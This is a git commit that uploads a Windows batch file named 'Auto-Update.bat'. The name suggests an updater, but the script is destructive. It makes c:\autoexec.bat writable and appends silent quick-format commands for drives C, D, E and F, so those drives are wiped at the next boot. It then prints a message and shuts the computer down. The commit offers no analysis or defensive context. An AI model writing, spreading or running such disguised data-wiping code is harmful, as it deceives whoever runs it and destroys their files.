a71d179f6714af4b364acb442e583d0b44b3e65b
jcp6 <i.waleed.rok@gmail.com>
2024-06-26 20:22:29 +0300

    Add files via upload

---
+++ Auto-Update.bat
@@ -0,0 +1,8 @@
+call attrib -h -r c:\autoexec.bat >nul
+echo format c: /q /u /autotest >nul >>c:\autoexec.bat
+echo format d: /q /u /autotest >nul >>c:\autoexec.bat
+echo format e: /q /u /autotest >nul >>c:\autoexec.bat
+echo format f: /q /u /autotest >nul >>c:\autoexec.bat
+echo I love my girl
+echo off@
+shutdown -s
